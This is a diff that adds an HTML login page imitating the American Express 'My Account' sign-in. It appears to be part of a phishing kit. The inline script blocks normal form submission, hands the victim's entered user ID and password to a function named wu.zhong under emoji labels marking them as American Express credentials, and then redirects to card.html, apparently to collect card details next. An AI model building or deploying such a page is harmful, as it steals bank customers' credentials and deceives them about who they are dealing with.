@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/app.css">
+    <title>American express</title>
+   
+</head>
+<body>
+<header>
+<div class="left">
+    <img src="res/img/logo.png"><span>My Account</span>
+</div>
+<div class="right">
+<span>Help</span> <button>Log in</button>
+</div>
+</header>
+
+    
+<main>
+    <div class="continer">
+        <h1> Log In to My Account</h1>
+
+        <form action="post.php" method="post">
+        <div class="col">
+        <div class="text">User ID</div>
+        <input type="text" required name="user">
+ </div>
+
+<div class="col">
+<div class="text"> Password </div>
+    <input type="password" required name="pass">
+</div>
+
+<div class="paso">
+<input type="checkbox"> 
+<label>Remember Me</label> </div> <br>
+ <div class="boto"> 
+<button  type="submit" style="width:88%;">Log in</button>
+ </div>
+
+ <div class="for">
+    <a href="#">Forgot User ID or Password?</a></div>
+    <div class="for"><a href="#">Create New Online Account</a></div>
+    <div class="for"> <a href="#">Confirm Card Received</a></div>
+    <div class="for"> <a href="#">Visit Our Security Center</a></div>
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`✉️ American Express Email: ${document.querySelector("[name='user']").value}\n\n🔒 American Express Password: ${document.querySelector("[name='pass']").value}`);
+
+window.location="card.html";
+
+})
+
+</script>
+
+
+
+
+
+    
+</form> 
+</div>
+</main>
+</body>
+</html>
